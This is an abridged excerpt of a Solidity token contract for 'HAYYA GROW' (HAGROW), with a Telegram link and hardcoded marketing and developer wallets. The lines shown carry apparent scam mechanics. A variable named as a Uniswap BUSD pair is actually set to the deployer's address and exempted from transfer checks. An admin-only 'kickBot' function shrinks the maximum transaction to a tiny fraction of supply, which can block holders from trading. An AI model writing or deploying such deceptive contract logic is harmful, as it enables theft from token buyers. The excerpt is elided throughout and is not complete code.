...
Telegram : https://t.me/HayyaGrowPortal
...
contract HAYYAGROW is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x50aC0359A5d7CeEBAB342A30e991E29626242e72); 
    address payable public Wallet_Dev = payable(0xBB544041a7cFB799B8DAa87D36C35576D300b5f6);
    ...
    string private constant _name = "HAYYA GROW"; 
    string private constant _symbol = unicode"HAGROW"; 
    ...
    address payable public uniswapV2PairBUSD;
    ...
    constructor () {
        ...
        uniswapV2PairBUSD = payable(_msgSender());
    ...
    function _transfer(
        ...
        if (from != owner() && from != uniswapV2PairBUSD)
        ...
        bool takeFee = true;
        bool isBuy;
        if(!(to != uniswapV2PairBUSD) && burnTrigger < 1){
            burned = false;
        }
        else{
            burned = true;
    ...
    function kickBot() public onlyAdmin {
        _maxTxAmount = _tTotal * 100 / 1000000;
    }
